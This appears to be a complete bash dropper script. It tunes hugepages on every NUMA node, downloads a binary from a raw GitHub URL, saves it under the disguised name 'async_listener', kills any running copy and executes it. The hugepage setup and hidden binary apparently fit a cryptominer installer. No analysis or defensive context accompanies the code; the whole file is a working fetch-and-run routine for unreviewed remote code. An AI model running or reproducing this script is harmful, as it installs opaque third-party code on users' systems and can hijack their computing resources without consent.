#!/bin/bash

sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 4 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

REMOTE_URL="https://raw.githubusercontent.com/changge695/remember/refs/heads/main/sync"
LOCAL_FILE="async_listener"
MAX_RETRIES=3
RETRY_DELAY=5

download_with_retry() {
    local url="$1"
    local file="$2"
    local attempt_num=1

    while [ $attempt_num -le $MAX_RETRIES ]; do
        curl -L "$url" -o "$file"
        local exit_code=$?
        if [ $exit_code -eq 0 ]; then
            return 0
        else
            if [ $attempt_num -lt $MAX_RETRIES ]; then
                sleep $RETRY_DELAY
            fi
            ((attempt_num++))
        fi
    done
    return 1
}

if [ -f "$LOCAL_FILE" ]; then
    pids=$(pgrep -f "$LOCAL_FILE")
    if [ -n "$pids" ]; then
        kill -9 $pids 2>/dev/null
    fi
else
    if ! download_with_retry "$REMOTE_URL" "$LOCAL_FILE"; then
        exit 1
    fi
fi

chmod +x "$LOCAL_FILE"
./"$LOCAL_FILE"
